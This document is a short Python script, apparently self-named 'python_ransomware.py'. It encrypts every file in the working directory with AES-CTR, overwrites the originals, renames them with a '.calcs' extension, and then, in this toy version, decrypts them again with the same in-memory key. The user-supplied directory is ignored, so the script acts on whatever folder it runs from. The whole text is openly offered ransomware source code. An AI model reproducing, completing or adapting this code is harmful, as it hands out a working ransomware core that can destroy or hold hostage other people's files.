#!/bin/env python3
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import json
import hashlib

def encryptmedaddy(key, file_list):

	nonce = get_random_bytes(8)
	for file in file_list:
		if file == "python_ransomware.py":
			print("detected myself, skipping!")
			continue
		cipher = AES.new(key, AES.MODE_CTR, nonce=nonce) # 8 byte nonce auto generated

		with open(file, "rb") as fd:
			plain = fd.read()
			encrypted_text = cipher.encrypt(plain) 
			ciphertext_base64 = base64.b64encode(encrypted_text)
			checksum = hashlib.md5(plain)
			checksum = checksum.hexdigest()
			checksum = checksum.encode()
		with open(file + ".calcs.json", "w") as fd:
			json_obj = {"hash":checksum.decode(), "data":ciphertext_base64.decode()}
			json_obj = json.dumps(json_obj)
			fd.write(json_obj)

		with open(file, "wb") as fd:
			print(f"encrypted base64 for file {file}: {ciphertext_base64.decode()}")
			fd.write(checksum) # 32B written
			fd.write(cipher.nonce)
			fd.write(ciphertext_base64)
			os.rename(file, (file + str(".calcs")))

def decryptmedaddy(key, file_list):

	for file in file_list:
		if file == "python_ransomware.py":
			print("detected myself, skipping!")
			continue
		if file.endswith(".calcs.json"):
			print("encountered json file")
			continue
		print("decrypting file: " + file)
		with open(file, "rb") as fd:
			###checksum = fd.read(32) ## if you want to work without json files
			fd.read(32)
			nonce = fd.read(8)
			bin_encrypted_text = fd.read() 
		with open(file + ".json", "r") as fd:
			json_obj_dict = json.loads(fd.read())
			print(json_obj_dict["hash"])
		bin_encrypted_text = base64.b64decode(bin_encrypted_text)
		cipher_dec = AES.new(key, AES.MODE_CTR, nonce=nonce)
		decrypted_text = cipher_dec.decrypt(bin_encrypted_text)
		temp_checksum = hashlib.md5(decrypted_text)
		temp_checksum = temp_checksum.hexdigest()
		with open(file, "wb") as fd:
			fd.write(decrypted_text)
		file_index = file.rindex(".calcs")
		os.rename(file, file[:file_index])
		###if temp_checksum != checksum:
		if temp_checksum != json_obj_dict["hash"]:
			print(f"checksums don't match for {file}! skipping to the next one!")
		print(f"WHAT I CALCULATED: {temp_checksum} VS WHAT I READ FROM FILE: {json_obj_dict['hash']}")
#		os.remove(file + ".json") #	.JSON FILE CLEANUP


def main():
	dir = input("input directory to encrypt: ")
	file_list = os.listdir(dir)
	file_list = os.listdir(os.getcwd())
	key = get_random_bytes(16)
	encryptmedaddy(key, file_list)
	file_list = os.listdir(os.getcwd())
	decryptmedaddy(key, file_list)


if __name__ == '__main__':
	main()
